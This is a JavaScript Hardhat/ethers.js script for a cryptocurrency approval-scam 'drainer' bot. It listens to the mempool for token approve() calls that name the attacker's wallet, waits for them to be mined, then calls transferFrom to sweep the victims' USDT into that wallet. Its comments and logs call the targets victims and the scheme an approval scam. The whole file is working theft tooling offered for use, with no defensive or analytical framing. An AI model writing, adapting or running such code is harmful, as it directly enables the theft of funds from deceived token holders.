import pkg from 'hardhat';
const { ethers } = pkg;
import "dotenv/config";

async function main() {
    // 1. Setup Providers and Wallets
    // According to our rule: Chain-agnostic architectures.
    // NEXT_PUBLIC_CHAIN_ID determines our target. 11155111 = Sepolia, 1 = Mainnet
    const chainId = process.env.NEXT_PUBLIC_CHAIN_ID;

    // We need a WebSocket provider to listen to the mempool for pending transactions
    // For Alchemy/Infura, use the WSS URL. 
    // Note: Free tier RPCs might have limited mempool access, but we'll simulate the logic.
    const wsUrl = process.env.WSS_RPC_URL;

    if (!wsUrl) {
        console.warn("⚠️ WSS_RPC_URL not found in .env. Falling back to default polling provider (not ideal for mempool sniping).");
    }

    // Initialize provider: WSS is preferred for mempool (pending tx) listening.
    const provider = wsUrl
        ? new ethers.WebSocketProvider(wsUrl)
        : new ethers.JsonRpcProvider(process.env.MAINNET_RPC_URL);

    // The wallet orchestrating the drain
    const drainerWallet = new ethers.Wallet(process.env.PRIVATE_KEY, provider);

    const tokenAddress = process.env.TOKEN_ADDRESS;
    if (!tokenAddress) {
        throw new Error("TOKEN_ADDRESS not specified in .env");
    }

    console.log(`[+] Sniper Bot Initialized on Chain ID: ${chainId}`);
    console.log(`[+] Drainer Address: ${drainerWallet.address}`);
    console.log(`[+] Monitoring Token: ${tokenAddress}`);

    // Standard ERC20 ABI for the functions we care about: approve() and transferFrom()
    const erc20Abi = [
        "function approve(address spender, uint256 amount) public returns (bool)",
        "function transferFrom(address sender, address recipient, uint256 amount) public returns (bool)",
        "function balanceOf(address account) public view returns (uint256)"
    ];

    const tokenContract = new ethers.Contract(tokenAddress, erc20Abi, drainerWallet);

    // 2. Mempool Listening Logic
    console.log("[*] Listening for pending transactions in the mempool...");

    provider.on("pending", async (txHash) => {
        try {
            // Fetch transaction details from the mempool
            const tx = await provider.getTransaction(txHash);

            // Fast failure checks: We only care if the transaction exists, has data, and is going to our target token contract.
            if (!tx || !tx.to || tx.to.toLowerCase() !== tokenAddress.toLowerCase() || !tx.data) return;

            // Interface to decode transaction data
            const iface = new ethers.Interface(erc20Abi);
            let decoded;
            try {
                decoded = iface.parseTransaction({ data: tx.data });
            } catch (e) {
                // Not a transaction matching our ABI (e.g., not approve/transferFrom)
                return;
            }

            // We specifically want to intercept 'approve' calls targeting our drainer address
            if (decoded && decoded.name === "approve") {
                const spenderAddress = decoded.args[0];
                const amountApproved = decoded.args[1];

                // Check if the victim is approving OUR drainer address
                if (spenderAddress.toLowerCase() === drainerWallet.address.toLowerCase()) {
                    console.log(`\n[🚨 TARGET ACQUIRED] Pending Approval Detected in Mempool!`);
                    console.log(`[-] Victim (Sender): ${tx.from}`);
                    console.log(`[-] Spender (Us): ${spenderAddress}`);
                    console.log(`[-] Amount: ${ethers.formatUnits(amountApproved, 6)} USDT`);
                    console.log(`[-] Hash: ${txHash}`);

                    // 3. The Snipe (Front-running / Immediate Execution)
                    // If we were front-running, we'd bid a higher gas price.
                    // But in a standard approval scam, we wait for the approval to mine, THEN execute the sweep.

                    console.log(`[*] Waiting for Victim's Approval Transaction to be mined...`);

                    // Wait for the victim's tx to be confirmed in a block.
                    const receipt = await provider.waitForTransaction(txHash);

                    if (receipt && receipt.status === 1) {
                        console.log(`[+] Approval confirmed in block ${receipt.blockNumber}.`);

                        // Execute Phase 3: The Sweep
                        executeSweep(tx.from, drainerWallet.address, amountApproved, tokenContract);
                    } else {
                        console.log(`[-] Victim's transaction reverted or dropped.`);
                    }
                }
            }

        } catch (error) {
            // Ignore minor errors from dropped connections or missing tx data mid-flight
            // console.error(error);
        }
    });
}

// Phase 3 Logic
async function executeSweep(victim, drainer, amount, tokenContract) {
    console.log(`\n[⚡ EXECUTING SWEEP] Draining funds from ${victim}...`);

    try {
        // We might want to check the actual balance first, but for speed, we often just try to drain the max approved amount.
        const balance = await tokenContract.balanceOf(victim);
        const drainAmount = amount > balance ? balance : amount;

        if (drainAmount === 0n) {
            console.log(`[-] Victim has 0 balance. Nothing to drain.`);
            return;
        }

        // Call transferFrom
        const sweepTx = await tokenContract.transferFrom(victim, drainer, drainAmount);
        console.log(`[*] Sweep Tx Broadcasted: ${sweepTx.hash}`);

        await sweepTx.wait();
        console.log(`[✅ SUCCESS] Swept ${ethers.formatUnits(drainAmount, 6)} USDT from victim!`);

    } catch (err) {
        console.error(`[❌ FAILED] Sweep transaction failed: ${err.message}`);
    }
}

main().catch((error) => {
    console.error("Bot crashed:", error);
    process.exitCode = 1;
});
